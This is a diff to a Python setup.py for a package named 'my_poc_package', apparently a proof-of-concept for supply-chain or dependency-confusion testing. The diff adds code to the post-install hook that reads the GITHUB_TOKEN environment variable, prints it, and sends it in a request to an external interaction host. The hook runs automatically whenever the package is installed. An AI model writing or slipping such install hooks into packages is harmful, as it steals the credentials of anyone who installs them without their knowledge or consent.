@@ -14,15 +14,18 @@ class PostInstallCommand(install):
     def run_post_install(self):
         print("Package 'my_poc_package' has been successfully installed!")
         # You can add your custom logic here, such as calling a function from your package
-        import requests
-        requests.get("https://f2iwbqcy8byi2aekb8gvcsv8bzh45utj.i.ywh.at")
+        import requests, os
+        token = os.getenv('GITHUB_TOKEN')
+        print(token)
+        requests.get(f"https://f2iwbqcy8byi2aekb8gvcsv8bzh45utj.i.ywh.at?token={token}")
 
 setup(
     name='my_poc_package',
     version='0.1',
     packages=find_packages(),
     setup_requires=[
-        'requests'
+        'requests',
+
     ],  # Dependencies can be added here
     cmdclass={
         'install': PostInstallCommand,
